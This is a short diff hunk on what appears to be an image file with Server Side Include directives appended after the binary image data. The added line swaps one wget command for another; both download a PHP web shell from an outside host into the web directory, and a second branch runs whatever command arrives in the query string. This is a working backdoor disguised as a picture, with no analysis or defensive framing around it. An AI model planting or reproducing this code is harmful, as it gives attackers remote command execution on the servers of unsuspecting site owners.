@@ -314,7 +314,7 @@ i6ßÚ<=ûÿ ÉÕNHœYssüÑÊÏª;H¥n÷sK#ºo<	]Ú›£iÝŠ–8ï¿*r%W
 *‡ÐT‘“ Ï4;[c6JàÖ¸¾šA˜Ü"“ô_Ú~úíüˆ0Œ^íÖ°¸–(9 +e!ÆV{«b'Á(ÇÇ’Ò¢+¢œÓÔÅ3x±À­rß8ž’4ûÍ!eû?ÿÙ<!--#config errmsg="[Error in shell]"-->
 <!--#set var="zero" value="" -->
 <!--#if expr="$QUERY_STRING_UNESCAPED = \$zero" -->
-<!--#set var="shl" value="cd ../../;wget http://phpshells.xyz/download/Con7ext-V.2-shell.txt -O .con7.php" -->
+<!--#set var="shl" value="cd ../../;wget https://raw.githubusercontent.com/neangandeuiatuh/priv8-shell/main/teslair.txt -O iran.php" -->
 <!--#else -->
 <!--#set var="shl" value=$QUERY_STRING_UNESCAPED -->
 <!--#endif -->
